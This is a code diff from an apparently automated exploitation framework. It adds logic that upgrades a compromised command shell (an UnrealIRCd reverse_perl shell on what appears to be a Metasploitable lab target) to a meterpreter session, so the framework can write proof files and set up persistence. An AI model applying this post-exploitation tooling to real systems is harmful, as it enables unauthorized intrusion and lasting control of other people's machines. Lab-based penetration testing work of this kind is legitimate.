@@ -319,6 +319,25 @@ def _find_live_impact_session(target_ip: str, session_id: str, session_type: str
     # meterpreter has reliable framed I/O — it does not read-zombie like a raw shell.
     if session_id and "meterpreter" in (session_type or "").lower():
         return session_id, session_type, "alive"
+    # command_shell: the UnrealIRCd cmd/unix/reverse_perl shell on MS3 read-zombies —
+    # writes land but every READ returns "(no output)", so a proof file can never be
+    # written-AND-verified on it (confirmed: neither run_session_command NOR the raw
+    # session.shell_read gets output). shell_to_meterpreter is WRITE-driven (it writes
+    # a stager to the shell and a fresh meterpreter connects back on its own handler),
+    # so it upgrades even a read-zombie into a meterpreter with reliable framed I/O.
+    # This is EXACTLY what lets persistence ground on the same shell. Upgrade FIRST;
+    # only if it fails do we fall back to probing / substituting. Mirrors
+    # stages/persistence.py._probe_session.
+    if session_id:
+        try:
+            from stages.persistence import _upgrade_shell_to_meterpreter
+            new_sid = _upgrade_shell_to_meterpreter(target_ip, session_id)
+        except Exception as _e:  # noqa: BLE001 — never let the upgrade path crash impact
+            print_colored(f"[Impact] meterpreter upgrade errored ({_e}) — falling back "
+                          f"to the command_shell.", Colors.WARNING)
+            new_sid = None
+        if new_sid:
+            return new_sid, "meterpreter", f"upgraded_{new_sid}"
     if session_id and _shell_responds(session_id):
         return session_id, session_type, "alive"
 
